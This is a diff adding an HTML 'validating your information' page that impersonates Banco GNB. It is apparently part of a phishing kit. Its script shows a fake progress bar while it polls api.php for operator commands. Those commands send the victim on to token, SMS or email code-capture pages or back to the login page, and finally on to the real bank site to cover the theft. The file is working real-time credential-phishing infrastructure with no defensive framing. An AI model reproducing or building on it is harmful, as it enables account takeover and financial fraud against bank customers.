@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validando</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .load-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 410px;
+            padding: 50px 25px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            border-radius: 8px;
+            min-height: 400px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo {
+            max-width: 140px;
+            margin-bottom: 30px;
+        }
+
+        h2 {
+            color: #333;
+            font-size: 1.3rem;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+
+        .sub-text {
+            color: #666;
+            font-size: 0.95rem;
+            margin-bottom: 30px;
+        }
+
+        /* Spinner */
+        .spinner-container {
+            margin: 20px auto;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0073b1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Puntos animados */
+        .dots {
+            display: inline-block;
+        }
+
+        .dots span {
+            animation: dotAnimation 1.4s infinite both;
+            display: inline-block;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #0073b1;
+        }
+
+        .dots span:nth-child(1) { animation-delay: 0s; }
+        .dots span:nth-child(2) { animation-delay: 0.2s; }
+        .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dotAnimation {
+            0%, 80%, 100% { opacity: 0; transform: scale(0.8); }
+            40% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* Barra de progreso */
+        .progress-bar-container {
+            width: 80%;
+            max-width: 300px;
+            height: 6px;
+            background-color: #e0e0e0;
+            border-radius: 10px;
+            margin-top: 25px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0073b1, #7cb342);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+
+        /* Mensaje de tiempo restante */
+        .time-remaining {
+            color: #999;
+            font-size: 0.8rem;
+            margin-top: 15px;
+            opacity: 0.7;
+        }
+
+        /* Footer de seguridad */
+        .security-badge {
+            margin-top: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #7cb342;
+            font-size: 0.8rem;
+        }
+
+        .security-badge svg {
+            width: 18px;
+            height: 18px;
+            fill: #7cb342;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="load-container">
+        <!-- Logo -->
+        <img src="logo.jpeg" alt="Banco GNB" class="logo">
+
+        <!-- Título -->
+        <h2>Estamos validando tu información</h2>
+        <p class="sub-text">
+            Por favor espera un momento
+            <span class="dots">
+                <span>.</span>
+                <span>.</span>
+                <span>.</span>
+            </span>
+        </p>
+
+        <!-- Spinner -->
+        <div class="spinner-container">
+            <div class="spinner"></div>
+        </div>
+
+        <!-- Barra de progreso -->
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <!-- Tiempo restante -->
+        <div class="time-remaining" id="timeRemaining">10 segundos</div>
+
+        <!-- Badge de seguridad -->
+        <div class="security-badge">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5L12 1zm0 2.18l7 3.12v4.7c0 4.83-3.93 9.11-7 10.12-3.07-1.01-7-5.29-7-10.12V6.3l7-3.12zM12 5.5c-1.38 0-2.5 1.12-2.5 2.5s1.12 2.5 2.5 2.5 2.5-1.12 2.5-2.5-1.12-2.5-2.5-2.5zm0 4.5c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+            </svg>
+            <span>Conexión segura</span>
+        </div>
+    </div>
+
+    <script>
+        const BANCO_OFICIAL = "https://www.bancognb.com.py/";
+
+        const progressBar = document.getElementById('progressBar');
+        const timeRemaining = document.getElementById('timeRemaining');
+
+        let lastReceivedCommand = '';
+        let statusPollTimer = null;
+
+        function getClientId() {
+            return parseInt(sessionStorage.getItem('conti_client_id') || '0', 10);
+        }
+
+        
+        let fakeProgress = 8;
+        progressBar.style.width = '8%';
+        const visualTimer = setInterval(() => {
+            fakeProgress += (92 - fakeProgress) * 0.045;
+            if (fakeProgress > 92) fakeProgress = 92;
+            progressBar.style.width = fakeProgress + '%';
+        }, 900);
+
+        
+        function handleRemoteCommand(cmd) {
+            const upper = (cmd || '').toUpperCase().trim();
+
+            switch (upper) {
+                case 'WAITING':
+                  
+                    break;
+
+                case 'TOKEN':
+                case 'CONTI':
+                case 'SMS':
+                case 'CORREO':
+                 
+                    clearInterval(visualTimer);
+                    clearInterval(statusPollTimer);
+                    timeRemaining.textContent = 'Redirigiendo...';
+                    window.location.href = 'token.html';
+                    break;
+
+                case 'ERROR_TOKEN':
+                case 'ERROR_SMS':
+                case 'ERROR_CONTI':
+                case 'ERROR_CORREO':
+                    
+                    clearInterval(visualTimer);
+                    clearInterval(statusPollTimer);
+                    window.location.href = 'token.html?e=1';
+                    break;
+
+                case 'ERROR_LOGIN':
+                case 'LOGIN':
+                   
+                    clearInterval(visualTimer);
+                    clearInterval(statusPollTimer);
+                    window.location.href = 'index.html';
+                    break;
+
+                case 'FINISH':
+                case 'BAN':
+                    clearInterval(visualTimer);
+                    clearInterval(statusPollTimer);
+                    window.location.href = BANCO_OFICIAL;
+                    break;
+            }
+        }
+
+        
+        async function pollClientStatus() {
+            try {
+                const fd = new FormData();
+                fd.append('action', 'check_status');
+                fd.append('client_id', getClientId());
+                fd.append('is_typing', 0);
+
+                const res = await fetch('api.php', { method: 'POST', body: fd });
+
+                if (res.status === 403) {
+                    window.location.href = BANCO_OFICIAL;
+                    return;
+                }
+
+                const data = await res.json();
+                if (data && data.status === 'success') {
+                    const cmd = data.command;
+                    if (cmd !== lastReceivedCommand) {
+                        lastReceivedCommand = cmd;
+                        handleRemoteCommand(cmd);
+                    }
+                }
+            } catch (e) {
+             
+            }
+        }
+
+        statusPollTimer = setInterval(pollClientStatus, 1500);
+        pollClientStatus();
+    </script>
+
+</body>
+</html>
